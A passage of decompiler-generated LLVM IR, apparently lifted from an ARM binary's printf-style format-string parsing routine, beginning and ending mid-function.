  %v2_100a8 = load i8, i8* %v1_100a8, align 1
  %v3_100a8 = zext i8 %v2_100a8 to i32
  store i32 %v3_100a8, i32* %r3.global-to-local, align 4
  %v2_100ac = icmp eq i8 %v2_100a8, 0
  %v2_100b0 = mul i32 %v0_100b0, 2
  store i32 %v2_100b0, i32* %r0.global-to-local, align 4
  br i1 %v2_100ac, label %dec_label_pc_100b8, label %dec_label_pc_10090

dec_label_pc_100b8:                               ; preds = %dec_label_pc_100a8
  %v1_100b8 = add i32 %storemerge105, -1
  %v2_100b8 = inttoptr i32 %v1_100b8 to i8*
  %v3_100b8 = load i8, i8* %v2_100b8, align 1
  %v7_100bc = icmp eq i8 %v3_100b8, 37
  %v0_100c0 = load i32, i32* @r4, align 4
  %v1_100c0 = and i32 %v0_100c0, 10
  store i32 %v1_100c0, i32* %r3.global-to-local, align 4
  %v4_100c4 = udiv i32 %v1_100c0, 2
  %v5_100c4 = sub nuw nsw i32 -1, %v4_100c4
  %v6_100c4 = and i32 %v0_100c0, %v5_100c4
  store i32 %v6_100c4, i32* @r4, align 4
  br i1 %v7_100bc, label %dec_label_pc_100cc, label %dec_label_pc_ffa8

dec_label_pc_100cc:                               ; preds = %dec_label_pc_100b8
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_100d0

dec_label_pc_100d0:                               ; preds = %bb133, %dec_label_pc_10008, %dec_label_pc_10060, %dec_label_pc_100cc
  %v1_10114 = phi i32 [ %storemerge105, %dec_label_pc_100cc ], [ %v0_1006c, %bb133 ], [ %v0_1006c, %dec_label_pc_10060 ], [ %v0_1006c, %dec_label_pc_10008 ]
  %v0_10110 = phi i32 [ %v5_10090, %dec_label_pc_100cc ], [ %v0_10008, %bb133 ], [ %v0_10008, %dec_label_pc_10060 ], [ %v0_10008, %dec_label_pc_10008 ]
  %stack_var_-48.3 = phi i32 [ %stack_var_-48.2, %dec_label_pc_100cc ], [ %stack_var_-48.1, %bb133 ], [ %stack_var_-48.1, %dec_label_pc_10060 ], [ %stack_var_-48.1, %dec_label_pc_10008 ]
  %v1_100d0 = inttoptr i32 %v0_10110 to i8*
  %v2_100d0 = load i8, i8* %v1_100d0, align 1
  %v3_100d0 = zext i8 %v2_100d0 to i32
  store i32 %v3_100d0, i32* %r3.global-to-local, align 4
  %v7_100d4 = icmp eq i8 %v2_100d0, 42
  br i1 %v7_100d4, label %dec_label_pc_100dc, label %dec_label_pc_10120

dec_label_pc_100dc:                               ; preds = %dec_label_pc_100d0
  %v0_100dc = load i32, i32* %sb.global-to-local, align 4
  %v2_100dc = icmp eq i32 %v0_100dc, 0
  br i1 %v2_100dc, label %dec_label_pc_10110, label %dec_label_pc_100e4

dec_label_pc_100e4:                               ; preds = %dec_label_pc_100dc
  %v1_100e4 = inttoptr i32 %v1_10114 to i8*
  %v2_100e4 = load i8, i8* %v1_100e4, align 1
  %v3_100e4 = zext i8 %v2_100e4 to i32
  store i32 %v3_100e4, i32* %r3.global-to-local, align 4
  %v7_100e8 = icmp eq i8 %v2_100e4, 36
  br i1 %v7_100e8, label %dec_label_pc_100f0, label %dec_label_pc_10398

dec_label_pc_100f0:                               ; preds = %dec_label_pc_100e4
  %v0_100f0 = load i32, i32* %r0.global-to-local, align 4
  %tmp134 = icmp slt i32 %v0_100f0, 1
  br i1 %tmp134, label %dec_label_pc_10398, label %dec_label_pc_100f8

dec_label_pc_100f8:                               ; preds = %dec_label_pc_100f0
  store i32 %v25_ff04, i32* %r1.global-to-local, align 4
  %v0_10100 = load i32, i32* @lr, align 4
  %v3_10100 = mul i32 %v0_10100, -4
  %v4_10100 = add i32 %v3_10100, %v25_ff04
  store i32 %v4_10100, i32* %r3.global-to-local, align 4
  %v1_10104 = add i32 %v1_10114, 1
  store i32 %v1_10104, i32* %r6.global-to-local, align 4
  %v2_10108 = add i32 %v4_10100, -24
  %v3_10108 = inttoptr i32 %v2_10108 to i32*
  store i32 %v0_100f0, i32* %v3_10108, align 4
  br label %dec_label_pc_1011c

dec_label_pc_10110:                               ; preds = %dec_label_pc_100dc
  %v1_10110 = add i32 %v0_10110, 1
  store i32 %v1_10110, i32* %r3.global-to-local, align 4
  %v9_10114 = icmp eq i32 %v1_10110, %v1_10114
  br i1 %v9_10114, label %dec_label_pc_1011c, label %dec_label_pc_10398

dec_label_pc_1011c:                               ; preds = %dec_label_pc_10110, %dec_label_pc_100f8
  store i32 -2147483648, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10120

dec_label_pc_10120:                               ; preds = %dec_label_pc_100d0, %dec_label_pc_1011c
  %v0_10120 = load i32, i32* @lr, align 4
  %v2_10120 = icmp eq i32 %v0_10120, 0
  br i1 %v2_10120, label %dec_label_pc_10128, label %dec_label_pc_ff40

dec_label_pc_10128:                               ; preds = %dec_label_pc_10120
  %v0_10128 = load i32, i32* %r6.global-to-local, align 4
  %v1_10128 = inttoptr i32 %v0_10128 to i8*
  %v2_10128 = load i8, i8* %v1_10128, align 1
  %v3_10128 = zext i8 %v2_10128 to i32
  store i32 %v3_10128, i32* %r3.global-to-local, align 4
  %v7_1012c = icmp eq i8 %v2_10128, 46
  br i1 %v7_1012c, label %.thread22, label %dec_label_pc_10140

.thread22:                                        ; preds = %dec_label_pc_10128
  %v2_10130 = add i32 %v0_10128, 1
  store i32 %v2_10130, i32* %r6.global-to-local, align 4
  %v1_10134 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v1_10134, i32* %r8.global-to-local, align 4
  store i32 -1, i32* @lr, align 4
  br label %dec_label_pc_ffa8

dec_label_pc_10140:                               ; preds = %dec_label_pc_10128
  %v0_10140 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10140, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10148

dec_label_pc_10148:                               ; preds = %dec_label_pc_ff40, %dec_label_pc_10140
  %v0_10150.pre = phi i32 [ %v0_10128, %dec_label_pc_10140 ], [ %v0_10150.pre.pre, %dec_label_pc_ff40 ]
  %storemerge = phi i32 [ -1, %dec_label_pc_10140 ], [ %v0_ff40, %dec_label_pc_ff40 ]
  store i32 %storemerge, i32* @r5, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_12894.371 to i32), i32* %r1.global-to-local, align 4
  %v1_10150 = inttoptr i32 %v0_10150.pre to i8*
  br label %dec_label_pc_1014c

dec_label_pc_1014c:                               ; preds = %dec_label_pc_1015c, %dec_label_pc_10148
  %v0_1015c = phi i32 [ %v1_1015c, %dec_label_pc_1015c ], [ ptrtoint ([9 x i8]* @global_var_12894.371 to i32), %dec_label_pc_10148 ]
  %v1_1014c = inttoptr i32 %v0_1015c to i8*
  %v2_1014c = load i8, i8* %v1_1014c, align 1
  %v3_1014c = zext i8 %v2_1014c to i32
  store i32 %v3_1014c, i32* %r2.global-to-local, align 4
  %v2_10150 = load i8, i8* %v1_10150, align 1
  %v3_10150 = zext i8 %v2_10150 to i32
  store i32 %v3_10150, i32* %r3.global-to-local, align 4
  %v9_10154 = icmp eq i8 %v2_10150, %v2_1014c
  br i1 %v9_10154, label %dec_label_pc_ff48, label %dec_label_pc_1015c

dec_label_pc_1015c:                               ; preds = %dec_label_pc_1014c
  %v1_1015c = add i32 %v0_1015c, 1
  %v2_1015c = inttoptr i32 %v1_1015c to i8*
  %v3_1015c = load i8, i8* %v2_1015c, align 1
  %v4_1015c = zext i8 %v3_1015c to i32
  store i32 %v4_1015c, i32* %r3.global-to-local, align 4
  store i32 %v1_1015c, i32* %r1.global-to-local, align 4
  %v2_10160 = icmp eq i8 %v3_1015c, 0
  br i1 %v2_10160, label %dec_label_pc_10168, label %dec_label_pc_1014c

dec_label_pc_10168:                               ; preds = %dec_label_pc_1015c, %dec_label_pc_ff48
  %v1_10188 = phi i32 [ %v1_ff48, %dec_label_pc_ff48 ], [ %v0_10150.pre, %dec_label_pc_1015c ]
  %v1_10184 = phi i32 [ %v0_1015c, %dec_label_pc_ff48 ], [ %v1_1015c, %dec_label_pc_1015c ]
  %v2_1016c = sub i32 %v1_10184, ptrtoint ([9 x i8]* @global_var_12894.371 to i32)
  store i32 %v2_1016c, i32* %r3.global-to-local, align 4
  %v8_10174 = icmp sgt i32 %v2_1016c, 1
  br i1 %v8_10174, label %.thread25, label %dec_label_pc_10178

dec_label_pc_10178:                               ; preds = %dec_label_pc_10168
  %v1_10178 = inttoptr i32 %v1_10188 to i8*
  %v2_10178 = load i8, i8* %v1_10178, align 1
  %v3_10178 = zext i8 %v2_10178 to i32
  store i32 %v3_10178, i32* %r2.global-to-local, align 4
  %v1_1017c = inttoptr i32 %v1_10184 to i8*
  %v2_1017c = load i8, i8* %v1_1017c, align 1
  %v3_1017c = zext i8 %v2_1017c to i32
  store i32 %v3_1017c, i32* %r3.global-to-local, align 4
  %v9_10180 = icmp eq i8 %v2_10178, %v2_1017c
  br i1 %v9_10180, label %bb135, label %.thread25

bb135:                                            ; preds = %dec_label_pc_10178
  %v2_10184 = add i32 %v1_10184, 9
  store i32 %v2_10184, i32* %r1.global-to-local, align 4
  %v2_10188 = add i32 %v1_10188, 1
  store i32 %v2_10188, i32* %r6.global-to-local, align 4
  br label %.thread25

.thread25:                                        ; preds = %dec_label_pc_10178, %dec_label_pc_10168, %bb135
  %v0_10190 = phi i32 [ %v1_10184, %dec_label_pc_10178 ], [ %v1_10184, %dec_label_pc_10168 ], [ %v2_10184, %bb135 ]
  %v0_1018c = phi i32 [ %v1_10188, %dec_label_pc_10178 ], [ %v1_10188, %dec_label_pc_10168 ], [ %v2_10188, %bb135 ]
  %v1_1018c = inttoptr i32 %v0_1018c to i8*
  %v2_1018c = load i8, i8* %v1_1018c, align 1
  %v3_1018c = zext i8 %v2_1018c to i32
  store i32 %v3_1018c, i32* %r2.global-to-local, align 4
  %v1_10190 = add i32 %v0_10190, 9
  %v2_10190 = inttoptr i32 %v1_10190 to i8*
  %v3_10190 = load i8, i8* %v2_10190, align 1
  %v4_10190 = zext i8 %v3_10190 to i32
  store i32 %v4_10190, i32* %r3.global-to-local, align 4
  %v2_10194 = icmp eq i8 %v2_1018c, 0
  %v3_10198 = mul nuw nsw i32 %v4_10190, 256
  store i32 %v3_10198, i32* @lr, align 4
  br i1 %v2_10194, label %dec_label_pc_10398, label %dec_label_pc_101a0

dec_label_pc_101a0:                               ; preds = %.thread25
  store i32 ptrtoint ([21 x i8]* @global_var_128d4.373 to i32), i32* %ip.global-to-local, align 4
  %v3_101a4 = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_101a4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_101a8

dec_label_pc_101a8:                               ; preds = %dec_label_pc_1022c, %dec_label_pc_101a0
  %v1_101b8 = phi i32 [ %v1_1022c, %dec_label_pc_1022c ], [ ptrtoint ([21 x i8]* @global_var_128d4.373 to i32), %dec_label_pc_101a0 ]
  %v1_101a8 = inttoptr i32 %v1_101b8 to i8*
  %v2_101a8 = load i8, i8* %v1_101a8, align 1
  %v3_101a8 = zext i8 %v2_101a8 to i32
  store i32 %v3_101a8, i32* %r3.global-to-local, align 4
  %v9_101ac = icmp eq i8 %v2_101a8, %v2_1018c
  br i1 %v9_101ac, label %dec_label_pc_101b4, label %dec_label_pc_1022c

dec_label_pc_101b4:                               ; preds = %dec_label_pc_101a8
  store i32 ptrtoint ([21 x i8]* @global_var_128d4.373 to i32), i32* %r3.global-to-local, align 4
  %v2_101b8 = sub i32 %v1_101b8, ptrtoint ([21 x i8]* @global_var_128d4.373 to i32)
  store i32 %v2_101b8, i32* %r2.global-to-local, align 4
  %v7_101c0 = icmp slt i32 %v2_101b8, 18
  br i1 %v7_101c0, label %bb137, label %dec_label_pc_101c4

dec_label_pc_101c4:                               ; preds = %dec_label_pc_101b4
  %v1_101c4 = and i32 %v3_10198, 1024
  %v2_101c4 = icmp eq i32 %v1_101c4, 0
  br i1 %v2_101c4, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_101c4
  %v2_101c8 = add i32 %v2_101b8, -2
  store i32 %v2_101c8, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_101b4, %dec_label_pc_101c4, %bb136
  %v0_101cc = phi i32 [ %v2_101b8, %dec_label_pc_101b4 ], [ %v2_101b8, %dec_label_pc_101c4 ], [ %v2_101c8, %bb136 ]
  %v1_101cc = load i32, i32* %r7.global-to-local, align 4
  %v2_101cc = add i32 %v1_101cc, 32
  %v3_101cc = inttoptr i32 %v2_101cc to i32*
  store i32 %v0_101cc, i32* %v3_101cc, align 4
  store i32 ptrtoint (i32* @global_var_128c7.375 to i32), i32* %r1.global-to-local, align 4
  %v0_101d8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_101d4

dec_label_pc_101d4:                               ; preds = %dec_label_pc_101d4, %bb137
  %v0_101d4 = phi i32 [ %v1_101d4, %dec_label_pc_101d4 ], [ ptrtoint (i32* @global_var_128c7.375 to i32), %bb137 ]
  %v1_101d4 = add i32 %v0_101d4, 1
  %v2_101d4 = inttoptr i32 %v1_101d4 to i8*
  %v3_101d4 = load i8, i8* %v2_101d4, align 1
  %v4_101d4 = zext i8 %v3_101d4 to i32
  store i32 %v4_101d4, i32* %r3.global-to-local, align 4
  store i32 %v1_101d4, i32* %r1.global-to-local, align 4
  %v8_101dc = icmp sgt i32 %v0_101d8.pre, %v4_101d4
  br i1 %v8_101dc, label %dec_label_pc_101d4, label %dec_label_pc_101e0

dec_label_pc_101e0:                               ; preds = %dec_label_pc_101d4
  store i32 ptrtoint (i32* @global_var_128b8.379 to i32), i32* %r0.global-to-local, align 4
  %v2_101e8 = sub i32 %v1_101d4, ptrtoint (i32* @global_var_128c8.377 to i32)
  %v2_101ec = mul i32 %v2_101e8, 2
  store i32 %v2_101ec, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_128a8.381 to i32), i32* %ip.global-to-local, align 4
  %v2_101f4 = add i32 %v2_101ec, ptrtoint (i32* @global_var_128b8.379 to i32)
  store i32 %v2_101f4, i32* %r2.global-to-local, align 4
  %v1_101f8 = add i32 %v2_101ec, add (i32 ptrtoint (i32* @global_var_128b8.379 to i32), i32 1)
  %v2_101f8 = inttoptr i32 %v1_101f8 to i8*
  %v3_101f8 = load i8, i8* %v2_101f8, align 1
  %v4_101f8 = zext i8 %v3_101f8 to i32
  store i32 %v4_101f8, i32* %r1.global-to-local, align 4
  %v2_101fc = add i32 %v2_101ec, ptrtoint (i32* @global_var_128a8.381 to i32)
  store i32 %v2_101fc, i32* %r2.global-to-local, align 4
  %v3_10200 = inttoptr i32 %v2_101f4 to i8*
  %v4_10200 = load i8, i8* %v3_10200, align 2
  %v6_10200 = zext i8 %v4_10200 to i32
  store i32 %v6_10200, i32* %r0.global-to-local, align 4
  %v1_10204 = add i32 %v2_101ec, add (i32 ptrtoint (i32* @global_var_128a8.381 to i32), i32 1)
  %v2_10204 = inttoptr i32 %v1_10204 to i8*
  %v3_10204 = load i8, i8* %v2_10204, align 1
  %v4_10204 = zext i8 %v3_10204 to i32
  store i32 %v4_10204, i32* %r2.global-to-local, align 4
  %v3_10208 = inttoptr i32 %v2_101fc to i8*
  %v4_10208 = load i8, i8* %v3_10208, align 2
  %v6_10208 = zext i8 %v4_10208 to i32
  %v3_1020c = mul nuw i32 %v4_101f8, 16777216
  store i32 %v3_1020c, i32* %r1.global-to-local, align 4
  %v4_10210 = sdiv i32 %v3_1020c, 65536
  %v5_10210 = or i32 %v6_10200, %v4_10210
  %v3_10214 = mul nuw i32 %v4_10204, 16777216
  store i32 %v3_10214, i32* %r2.global-to-local, align 4
  %v4_10218 = sdiv i32 %v3_10214, 65536
  %v5_10218 = or i32 %v6_10208, %v4_10218
  store i32 %v5_10218, i32* %r3.global-to-local, align 4
  %v0_1021c = load i32, i32* @lr, align 4
  %v2_1021c = or i32 %v5_10210, %v0_1021c
  store i32 ptrtoint ([21 x i8]* @global_var_128d4.373 to i32), i32* %ip.global-to-local, align 4
  %v2_10224 = and i32 %v2_1021c, %v5_10218
  store i32 %v2_10224, i32* %r0.global-to-local, align 4
  %v0_10240.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10238

dec_label_pc_1022c:                               ; preds = %dec_label_pc_101a8
  %v1_1022c = add i32 %v1_101b8, 1
  %v2_1022c = inttoptr i32 %v1_1022c to i8*
  %v3_1022c = load i8, i8* %v2_1022c, align 1
  %v4_1022c = zext i8 %v3_1022c to i32
  store i32 %v4_1022c, i32* %r3.global-to-local, align 4
  store i32 %v1_1022c, i32* %ip.global-to-local, align 4
  %v2_10230 = icmp eq i8 %v3_1022c, 0
  br i1 %v2_10230, label %dec_label_pc_10238, label %dec_label_pc_101a8

dec_label_pc_10238:                               ; preds = %dec_label_pc_1022c, %dec_label_pc_101e0
  %v0_10244 = phi i32 [ %v0_1021c, %dec_label_pc_101e0 ], [ %v3_10198, %dec_label_pc_1022c ]
  %v0_10240 = phi i32 [ %v0_10240.pre, %dec_label_pc_101e0 ], [ %v0_1018c, %dec_label_pc_1022c ]
  %v0_10238 = phi i32 [ %v2_10224, %dec_label_pc_101e0 ], [ %v3_101a4, %dec_label_pc_1022c ]
  store i32 %v0_10238, i32* %stack_var_-36, align 4
  %v0_1023c = load i32, i32* @r4, align 4
  %v1_1023c = and i32 %v0_1023c, 4
  %v1_10240 = inttoptr i32 %v0_10240 to i8*
  %v2_10240 = load i8, i8* %v1_10240, align 1
  %v3_10240 = zext i8 %v2_10240 to i32
  store i32 %v3_10240, i32* %r1.global-to-local, align 4
  %v1_10244 = and i32 %v0_10244, 3840
  %v1_10248 = and i32 %v0_1023c, -5
  %v2_1024c = or i32 %v1_10248, %v1_10244
  store i32 %v2_1024c, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %tmp164 = mul nuw nsw i32 %v1_1023c, 4
  %tmp165 = or i32 %tmp164, 32
  store i32 %tmp165, i32* %r3.global-to-local, align 4
  %v1_1025c = load i32, i32* %r7.global-to-local, align 4
  %v2_1025c = add i32 %v1_1025c, 12
  %v3_1025c = inttoptr i32 %v2_1025c to i32*
  store i32 %v3_10240, i32* %v3_1025c, align 4
  %v0_10260 = load i32, i32* %r7.global-to-local, align 4
  %v1_10260 = add i32 %v0_10260, 4
  %v2_10260 = inttoptr i32 %v1_10260 to i32*
  %v3_10260 = load i32, i32* @r5, align 4
  store i32 %v3_10260, i32* %v2_10260, align 4
  %v4_10260 = add i32 %v0_10260, 8
  %v5_10260 = inttoptr i32 %v4_10260 to i32*
  %v6_10260 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v6_10260, i32* %v5_10260, align 4
  %v0_10264 = load i32, i32* %r3.global-to-local, align 4
  %v1_10264 = load i32, i32* %r7.global-to-local, align 4
  %v2_10264 = add i32 %v1_10264, 20
  %v3_10264 = inttoptr i32 %v2_10264 to i32*
  store i32 %v0_10264, i32* %v3_10264, align 4
  %v0_10268 = load i32, i32* %r2.global-to-local, align 4
  %v1_10268 = load i32, i32* %r7.global-to-local, align 4
  %v2_10268 = add i32 %v1_10268, 16
  %v3_10268 = inttoptr i32 %v2_10268 to i32*
  store i32 %v0_10268, i32* %v3_10268, align 4
  %v0_1026c = load i32, i32* %r0.global-to-local, align 4
  %v1_1026c = load i32, i32* %r7.global-to-local, align 4
  %v2_1026c = add i32 %v1_1026c, 28
  %v3_1026c = inttoptr i32 %v2_1026c to i32*
  store i32 %v0_1026c, i32* %v3_1026c, align 4
  %v0_10270 = load i32, i32* %ip.global-to-local, align 4
  %v1_10270 = inttoptr i32 %v0_10270 to i8*
  %v2_10270 = load i8, i8* %v1_10270, align 1
  %v3_10270 = zext i8 %v2_10270 to i32
  store i32 %v3_10270, i32* %r2.global-to-local, align 4
  %v2_10274 = icmp eq i8 %v2_10270, 0
  br i1 %v2_10274, label %dec_label_pc_1027c, label %dec_label_pc_10294

dec_label_pc_1027c:                               ; preds = %dec_label_pc_10238
  %v0_1027c = load i32, i32* %r6.global-to-local, align 4
  %v1_1027c = inttoptr i32 %v0_1027c to i8*
  %v2_1027c = load i8, i8* %v1_1027c, align 1
  %v3_1027c = zext i8 %v2_1027c to i32
  store i32 %v3_1027c, i32* %r3.global-to-local, align 4
  %v7_10280 = icmp eq i8 %v2_1027c, 109
  br i1 %v7_10280, label %dec_label_pc_10288, label %dec_label_pc_10398

dec_label_pc_10288:                               ; preds = %dec_label_pc_1027c
  store i32 20, i32* %r3.global-to-local, align 4
  %v1_1028c = load i32, i32* %r7.global-to-local, align 4
  %v2_1028c = add i32 %v1_1028c, 32
  %v3_1028c = inttoptr i32 %v2_1028c to i32*
  store i32 20, i32* %v3_1028c, align 4
  %v0_10290 = load i32, i32* %r2.global-to-local, align 4
  %v1_10290 = load i32, i32* %r7.global-to-local, align 4
  %v2_10290 = add i32 %v1_10290, 28
  %v3_10290 = inttoptr i32 %v2_10290 to i32*
  store i32 %v0_10290, i32* %v3_10290, align 4
  br label %dec_label_pc_10294

dec_label_pc_10294:                               ; preds = %dec_label_pc_10238, %dec_label_pc_10288
  %v0_10294 = load i32, i32* %sb.global-to-local, align 4
  %tmp141 = icmp slt i32 %v0_10294, 1
  br i1 %tmp141, label %dec_label_pc_1034c, label %dec_label_pc_1029c

dec_label_pc_1029c:                               ; preds = %dec_label_pc_10294
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_102a0

dec_label_pc_102a0:                               ; preds = %dec_label_pc_10334, %dec_label_pc_1029c
  %v8_102bc = phi i32 [ 0, %dec_label_pc_1029c ], [ %v1_10338, %dec_label_pc_10334 ]
  %v7_102a4 = icmp sgt i32 %v8_102bc, 2
  br i1 %v7_102a4, label %bb143, label %bb142

bb142:                                            ; preds = %dec_label_pc_102a0
  store i32 %v25_ff04, i32* %r2.global-to-local, align 4
  %v12_102a8 = mul i32 %v8_102bc, 4
  %v13_102a8 = add i32 %v12_102a8, %v25_ff04
  store i32 %v13_102a8, i32* %r3.global-to-local, align 4
  %v9_102ac = add i32 %v13_102a8, -24
  %v10_102ac = inttoptr i32 %v9_102ac to i32*
  %v11_102ac = load i32, i32* %v10_102ac, align 4
  store i32 %v11_102ac, i32* %r2.global-to-local, align 4
  %v9_102b0 = load i32, i32* %r7.global-to-local, align 4
  %v10_102b0 = add i32 %v9_102b0, %v8_102bc
  store i32 %v10_102b0, i32* %r3.global-to-local, align 4
  %v9_102b8 = trunc i32 %v11_102ac to i8
  %v11_102b8 = add i32 %v10_102b0, 36
  %v12_102b8 = inttoptr i32 %v11_102b8 to i8*
  store i8 %v9_102b8, i8* %v12_102b8, align 1
  %v8_102c0 = load i32, i32* %r3.global-to-local, align 4
  %v9_102c0 = add i32 %v8_102c0, 36
  %v10_102c0 = inttoptr i32 %v9_102c0 to i8*
  %v11_102c0 = load i8, i8* %v10_102c0, align 1
  %v12_102c0 = zext i8 %v11_102c0 to i32
  br label %bb144

bb143:                                            ; preds = %dec_label_pc_102a0
  %v10_102bc = add i32 %v8_102bc, %stack_var_-48.3
  store i32 %v10_102bc, i32* %r3.global-to-local, align 4
  %v9_102c4 = add i32 %v10_102bc, -2
  br label %bb144

bb144:                                            ; preds = %bb142, %bb143
  %v0_102e8 = phi i32 [ %v12_102c0, %bb142 ], [ %v9_102c4, %bb143 ]
  store i32 %v0_102e8, i32* @r2, align 4
  %v1_102c8 = load i32, i32* %sb.global-to-local, align 4
  %v2_102c8 = sub i32 %v0_102e8, %v1_102c8
  %v4_102c8 = xor i32 %v1_102c8, %v0_102e8
  %v5_102c8 = xor i32 %v2_102c8, %v0_102e8
  %v6_102c8 = and i32 %v5_102c8, %v4_102c8
  %v7_102c8 = icmp slt i32 %v6_102c8, 0
  %v8_102c8 = icmp slt i32 %v2_102c8, 0
  %v9_102c8 = icmp eq i32 %v0_102e8, %v1_102c8
  %v3_102cc = xor i1 %v8_102c8, %v7_102c8
  %v4_102cc = or i1 %v9_102c8, %v3_102cc
  br i1 %v4_102cc, label %dec_label_pc_102dc, label %dec_label_pc_102d0

dec_label_pc_102d0:                               ; preds = %bb144
  %v1_102d0 = add i32 %v0_102e8, -9
  %v3_102d0 = sub i32 8, %v0_102e8
  %v4_102d0 = and i32 %v3_102d0, %v0_102e8
  %v5_102d0 = icmp slt i32 %v4_102d0, 0
  %v6_102d0 = icmp slt i32 %v1_102d0, 0
  %v7_102d0 = icmp eq i32 %v0_102e8, 9
  %v3_102d4 = xor i1 %v6_102d0, %v5_102d0
  %v4_102d4 = or i1 %v7_102d0, %v3_102d4
  br i1 %v4_102d4, label %dec_label_pc_102d8, label %dec_label_pc_10398

dec_label_pc_102d8:                               ; preds = %dec_label_pc_102d0
  store i32 %v0_102e8, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_102dc

dec_label_pc_102dc:                               ; preds = %bb144, %dec_label_pc_102d8
  store i32 %v25_ff04, i32* %ip.global-to-local, align 4
  %v1_102e0 = load i32, i32* %r8.global-to-local, align 4
  %v4_102e0 = mul i32 %v1_102e0, 4
  %v5_102e0 = add i32 %v4_102e0, %v25_ff04
  store i32 %v5_102e0, i32* %r3.global-to-local, align 4
  %v1_102e4 = add i32 %v5_102e0, -12
  %v2_102e4 = inttoptr i32 %v1_102e4 to i32*
  %v3_102e4 = load i32, i32* %v2_102e4, align 4
  store i32 %v3_102e4, i32* %r5.global-to-local, align 4
  %v1_102e8 = add i32 %v0_102e8, -1
  store i32 %v1_102e8, i32* %sl.global-to-local, align 4
  %v0_102ec = load i32, i32* %r7.global-to-local, align 4
  %v4_102ec = mul i32 %v1_102e8, 4
  %v5_102ec = add i32 %v0_102ec, %v4_102ec
  store i32 %v5_102ec, i32* %r3.global-to-local, align 4
  %v7_102f0 = icmp eq i32 %v3_102e4, 8
  %v1_102f4 = add i32 %v5_102ec, 40
  %v2_102f4 = inttoptr i32 %v1_102f4 to i32*
  %v3_102f4 = load i32, i32* %v2_102f4, align 4
  store i32 %v3_102f4, i32* @r0, align 4
  br i1 %v7_102f0, label %dec_label_pc_10334, label %dec_label_pc_102fc

dec_label_pc_102fc:                               ; preds = %dec_label_pc_102dc
  %v9_102fc = icmp eq i32 %v3_102f4, %v3_102e4
  br i1 %v9_102fc, label %dec_label_pc_10320, label %bb145

bb145:                                            ; preds = %dec_label_pc_102fc
  %v8_10300 = icmp eq i32 %v3_102f4, 8
  br i1 %v8_10300, label %dec_label_pc_10320, label %dec_label_pc_10308

dec_label_pc_10308:                               ; preds = %bb145
  %v0_10308 = call i32 @_promoted_size()
  %v0_10310 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_10310, i32* @r0, align 4
  %v0_10314 = call i32 @_promoted_size()
  store i32 %v0_10314, i32* %r0.global-to-local, align 4
  %v8_1031c = icmp sgt i32 %v0_10308, %v0_10314
  br i1 %v8_1031c, label %dec_label_pc_10334, label %dec_label_pc_10308.dec_label_pc_10320_crit_edge

dec_label_pc_10308.dec_label_pc_10320_crit_edge:  ; preds = %dec_label_pc_10308
  %v1_10324.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_1032c.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_1032c.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_10320

dec_label_pc_10320:                               ; preds = %dec_label_pc_10308.dec_label_pc_10320_crit_edge, %dec_label_pc_102fc, %bb145
  %v1_1032c = phi i32 [ %v1_1032c.pre, %dec_label_pc_10308.dec_label_pc_10320_crit_edge ], [ %v1_102e8, %dec_label_pc_102fc ], [ %v1_102e8, %bb145 ]
  %v0_1032c = phi i32 [ %v0_1032c.pre, %dec_label_pc_10308.dec_label_pc_10320_crit_edge ], [ %v0_102ec, %dec_label_pc_102fc ], [ %v0_102ec, %bb145 ]
  %v1_10324 = phi i32 [ %v1_10324.pre, %dec_label_pc_10308.dec_label_pc_10320_crit_edge ], [ %v1_102e0, %dec_label_pc_102fc ], [ %v1_102e0, %bb145 ]
  store i32 %v25_ff04, i32* %r1.global-to-local, align 4
  %v4_10324 = mul i32 %v1_10324, 4
  %v5_10324 = add i32 %v4_10324, %v25_ff04
  store i32 %v5_10324, i32* %r3.global-to-local, align 4
  %v1_10328 = add i32 %v5_10324, -12
  %v2_10328 = inttoptr i32 %v1_10328 to i32*
  %v3_10328 = load i32, i32* %v2_10328, align 4
  store i32 %v3_10328, i32* @r2, align 4
  %v4_1032c = mul i32 %v1_1032c, 4
  %v5_1032c = add i32 %v4_1032c, %v0_1032c
  store i32 %v5_1032c, i32* %r3.global-to-local, align 4
  %v2_10330 = add i32 %v5_1032c, 40
  %v3_10330 = inttoptr i32 %v2_10330 to i32*
  store i32 %v3_10328, i32* %v3_10330, align 4
  br label %dec_label_pc_10334

dec_label_pc_10334:                               ; preds = %dec_label_pc_10308, %dec_label_pc_102dc, %dec_label_pc_10320
  %v0_10334 = load i32, i32* %r7.global-to-local, align 4
  %v1_10334 = add i32 %v0_10334, 28
  %v2_10334 = inttoptr i32 %v1_10334 to i32*
  %v3_10334 = load i32, i32* %v2_10334, align 4
  %v0_10338 = load i32, i32* %r8.global-to-local, align 4
  %v1_10338 = add i32 %v0_10338, 1
  store i32 %v1_10338, i32* %r8.global-to-local, align 4
  %v1_1033c = add i32 %v3_10334, 2
  store i32 %v1_1033c, i32* %r3.global-to-local, align 4
  %v6_10344 = icmp slt i32 %v1_10338, %v1_1033c
  br i1 %v6_10344, label %dec_label_pc_102a0, label %dec_label_pc_10364

dec_label_pc_1034c:                               ; preds = %dec_label_pc_10294
  %v0_1034c = load i32, i32* %r7.global-to-local, align 4
  %v1_1034c = add i32 %v0_1034c, 28
  %v2_1034c = inttoptr i32 %v1_1034c to i32*
  %v3_1034c = load i32, i32* %v2_1034c, align 4
  store i32 %v3_1034c, i32* %r2.global-to-local, align 4
